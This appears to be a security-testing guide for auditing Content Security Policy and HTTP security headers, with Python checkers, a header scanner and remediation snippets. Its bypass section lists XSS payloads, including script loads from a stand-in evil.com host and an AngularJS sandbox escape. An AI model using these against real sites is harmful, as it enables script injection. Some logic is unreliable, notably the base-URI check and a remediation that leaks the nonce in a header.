---
name: csp_header_analysis
description: Content Security Policy (CSP) analysis, bypass techniques, and security header testing
---

# CSP & Security Header Analysis

## Overview
Content Security Policy (CSP) and security headers protect against XSS, clickjacking, and other attacks. Testing must cover policy analysis, bypass techniques, and misconfigurations.

## Testing Methodology

### 1. CSP Policy Analysis

#### Parse CSP Header
```python
def parse_csp(header: str) -> dict:
    """Parse CSP header into structured format"""
    policies = {}
    
    for directive in header.split(';'):
        directive = directive.strip()
        if not directive:
            continue
        
        parts = directive.split()
        if len(parts) >= 2:
            name = parts[0]
            values = parts[1:]
            policies[name] = values
        elif len(parts) == 1:
            policies[parts[0]] = []
    
    return policies
```

#### Analyze CSP Strength
```python
def analyze_csp_strength(policies: dict) -> dict:
    """Analyze CSP policy strength"""
    issues = []
    
    # Check for unsafe-inline
    if "'unsafe-inline'" in policies.get('script-src', []):
        issues.append({
            "directive": "script-src",
            "issue": "unsafe-inline allows inline scripts",
            "severity": "HIGH"
        })
    
    # Check for unsafe-eval
    if "'unsafe-eval'" in policies.get('script-src', []):
        issues.append({
            "directive": "script-src",
            "issue": "unsafe-eval allows eval()",
            "severity": "HIGH"
        })
    
    # Check for wildcard
    if "*" in policies.get('script-src', []):
        issues.append({
            "directive": "script-src",
            "issue": "Wildcard allows any source",
            "severity": "CRITICAL"
        })
    
    # Check for missing directives
    missing = []
    recommended = ['default-src', 'script-src', 'style-src', 'img-src', 'font-src']
    for directive in recommended:
        if directive not in policies:
            missing.append(directive)
    
    if missing:
        issues.append({
            "directive": "missing",
            "issue": f"Missing directives: {', '.join(missing)}",
            "severity": "MEDIUM"
        })
    
    return {"issues": issues, "strength": len(issues) == 0}
```

### 2. CSP Bypass Techniques

#### Base URI Injection
```python
def test_base_uri_bypass(csp: dict) -> list:
    """Test for base-uri bypass"""
    bypasses = []
    
    script_src = csp.get('script-src', [])
    
    if "'unsafe-inline'" in script_src:
        bypasses.append({
            "technique": "Base URI Injection",
            "payload": "<base href='https://evil.com/'>",
            "description": "Can redirect relative script URLs"
        })
    
    if 'data:' in script_src:
        bypasses.append({
            "technique": "Data URI",
            "payload": "<script src='data:text/javascript,...'>",
            "description": "Can load scripts from data URIs"
        })
    
    return bypasses
```

#### JSONP Bypass
```python
def test_jsonp_bypass(csp: dict) -> list:
    """Test for JSONP bypass opportunities"""
    bypasses = []
    
    script_src = csp.get('script-src', [])
    
    # Common JSONP endpoints
    jsonp_endpoints = [
        "https://apis.google.com/js/plusone.js",
        "https://platform.twitter.com/widgets.js",
        "https://connect.facebook.net/en_US/sdk.js"
    ]
    
    for endpoint in jsonp_endpoints:
        domain = endpoint.split('/')[2]
        if any(domain in src for src in script_src):
            bypasses.append({
                "technique": "JSONP Bypass",
                "payload": f"<script src='{endpoint}?callback=alert'></script>",
                "description": f"Can use JSONP from {domain}"
            })
    
    return bypasses
```

#### AngularJS Sandbox Escape
```python
def test_angularjs_bypass(csp: dict) -> list:
    """Test for AngularJS sandbox bypass"""
    bypasses = []
    
    script_src = csp.get('script-src', [])
    
    angular_domains = [
        "https://ajax.googleapis.com",
        "https://code.angularjs.org"
    ]
    
    for domain in angular_domains:
        if any(d in src for src in script_src for d in [domain]):
            bypasses.append({
                "technique": "AngularJS Sandbox Escape",
                "payload": "{{constructor.constructor('alert(1)')()}}",
                "description": f"Can use AngularJS from {domain}"
            })
    
    return bypasses
```

#### DOM Clobbering
```python
def test_dom_clobbering_bypass(csp: dict) -> list:
    """Test for DOM clobbering bypass"""
    bypasses = []
    
    script_src = csp.get('script-src', [])
    
    if "'unsafe-inline'" in script_src:
        bypasses.append({
            "technique": "DOM Clobbering",
            "payload": "<a name='1'><a id='1' name='2'><img id='1' name='script' src='//evil.com/xss.js'>",
            "description": "Can clobber DOM to load scripts"
        })
    
    return bypasses
```

### 3. Security Header Analysis

#### Check Missing Headers
```python
def check_security_headers(headers: dict) -> list:
    """Check for missing security headers"""
    recommended = {
        "Strict-Transport-Security": {
            "description": "Enforce HTTPS",
            "severity": "MEDIUM"
        },
        "X-Content-Type-Options": {
            "description": "Prevent MIME sniffing",
            "severity": "MEDIUM"
        },
        "X-Frame-Options": {
            "description": "Prevent clickjacking",
            "severity": "MEDIUM"
        },
        "X-XSS-Protection": {
            "description": "Enable XSS filter (legacy)",
            "severity": "LOW"
        },
        "Referrer-Policy": {
            "description": "Control referrer information",
            "severity": "LOW"
        },
        "Permissions-Policy": {
            "description": "Control browser features",
            "severity": "LOW"
        }
    }
    
    issues = []
    for header, info in recommended.items():
        if header not in headers:
            issues.append({
                "header": header,
                "description": info["description"],
                "severity": info["severity"]
            })
    
    return issues
```

#### Analyze Header Values
```python
def analyze_header_values(headers: dict) -> list:
    """Analyze security header values"""
    issues = []
    
    # HSTS
    hsts = headers.get('Strict-Transport-Security', '')
    if hsts:
        if 'max-age=' in hsts:
            max_age = int(hsts.split('max-age=')[1].split(';')[0])
            if max_age < 31536000:  # 1 year
                issues.append({
                    "header": "Strict-Transport-Security",
                    "issue": f"max-age too short: {max_age}s",
                    "severity": "LOW"
                })
        if 'includeSubDomains' not in hsts:
            issues.append({
                "header": "Strict-Transport-Security",
                "issue": "Missing includeSubDomains",
                "severity": "LOW"
            })
    
    # X-Frame-Options
    xfo = headers.get('X-Frame-Options', '')
    if xfo and xfo.upper() not in ['DENY', 'SAMEORIGIN']:
        issues.append({
            "header": "X-Frame-Options",
            "issue": f"Invalid value: {xfo}",
            "severity": "MEDIUM"
        })
    
    # X-Content-Type-Options
    xcto = headers.get('X-Content-Type-Options', '')
    if xcto and xcto.lower() != 'nosniff':
        issues.append({
            "header": "X-Content-Type-Options",
            "issue": f"Invalid value: {xcto}",
            "severity": "MEDIUM"
        })
    
    return issues
```

### 4. CSP Reporting

#### Report-URI Analysis
```python
def analyze_report_uri(policies: dict) -> dict:
    """Analyze CSP report-uri directive"""
    report_uri = policies.get('report-uri', [])
    report_to = policies.get('report-to', [])
    
    return {
        "has_report_uri": bool(report_uri),
        "has_report_to": bool(report_to),
        "report_uri": report_uri[0] if report_uri else None,
        "recommendation": "Enable CSP reporting to monitor violations"
    }
```

### 5. Tools & Scripts

#### CSP Analyzer
```python
#!/usr/bin/env python3
"""CSP and security header analyzer"""
import asyncio
import aiohttp
from typing import Dict, List, Any

class CSPAnalyzer:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.findings: List[Dict[str, Any]] = []
    
    async def analyze_csp(self, session: aiohttp.ClientSession, endpoint: str):
        """Analyze CSP header"""
        async with session.get(f"{self.base_url}{endpoint}") as resp:
            csp_header = resp.headers.get('Content-Security-Policy', '')
            
            if not csp_header:
                self.findings.append({
                    "type": "NO_CSP",
                    "severity": "MEDIUM",
                    "description": "No Content-Security-Policy header"
                })
                return
            
            # Parse CSP
            policies = self._parse_csp(csp_header)
            
            # Check for unsafe directives
            script_src = policies.get('script-src', [])
            
            if "'unsafe-inline'" in script_src:
                self.findings.append({
                    "type": "CSP_UNSAFE_INLINE",
                    "severity": "HIGH",
                    "description": "CSP allows unsafe-inline scripts"
                })
            
            if "'unsafe-eval'" in script_src:
                self.findings.append({
                    "type": "CSP_UNSAFE_EVAL",
                    "severity": "HIGH",
                    "description": "CSP allows unsafe-eval"
                })
            
            if '*' in script_src:
                self.findings.append({
                    "type": "CSP_WILDCARD",
                    "severity": "CRITICAL",
                    "description": "CSP uses wildcard for script-src"
                })
    
    def _parse_csp(self, header: str) -> dict:
        """Parse CSP header"""
        policies = {}
        for directive in header.split(';'):
            parts = directive.strip().split()
            if len(parts) >= 2:
                policies[parts[0]] = parts[1:]
        return policies
    
    async def check_security_headers(self, session: aiohttp.ClientSession, endpoint: str):
        """Check for missing security headers"""
        async with session.get(f"{self.base_url}{endpoint}") as resp:
            headers = resp.headers
            
            recommended = [
                'Strict-Transport-Security',
                'X-Content-Type-Options',
                'X-Frame-Options',
                'X-XSS-Protection',
                'Referrer-Policy'
            ]
            
            for header in recommended:
                if header not in headers:
                    self.findings.append({
                        "type": f"MISSING_{header.upper().replace('-', '_')}",
                        "severity": "MEDIUM",
                        "description": f"Missing {header} header"
                    })
    
    async def run_all_tests(self, endpoints: List[str]) -> List[Dict[str, Any]]:
        """Run all CSP and header tests"""
        print("Starting CSP and header scan...")
        
        async with aiohttp.ClientSession() as session:
            for endpoint in endpoints:
                print(f"Testing {endpoint}...")
                await self.analyze_csp(session, endpoint)
                await self.check_security_headers(session, endpoint)
        
        print(f"\nScan complete. Found {len(self.findings)} issues.")
        for finding in self.findings:
            print(f"  [{finding['severity']}] {finding['description']}")
        
        return self.findings

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python csp_analyzer.py <base_url>")
        sys.exit(1)
    
    analyzer = CSPAnalyzer(sys.argv[1])
    asyncio.run(analyzer.run_all_tests(["/", "/login"]))
```

### 6. Remediation Guidance

#### Strong CSP Policy
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'nonce-{random}';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  report-uri /csp-report;
```

#### Nonce-Based CSP
```python
import secrets

def generate_csp_nonce():
    """Generate random nonce for CSP"""
    return secrets.token_hex(16)

# In response
nonce = generate_csp_nonce()
response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}'"
response.headers['X-Nonce'] = nonce
```

#### Security Headers Middleware
```python
@app.after_request
def add_security_headers(response):
    """Add security headers to all responses"""
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=()'
    return response
```

## Validation Checklist

- [ ] CSP header present
- [ ] No unsafe-inline in script-src
- [ ] No unsafe-eval in script-src
- [ ] No wildcards in script-src
- [ ] frame-ancestors set to 'none' or specific origins
- [ ] base-uri set to 'self'
- [ ] form-action set to 'self'
- [ ] Report-URI configured
- [ ] All recommended security headers present
- [ ] HSTS max-age >= 1 year
- [ ] HSTS includes includeSubDomains
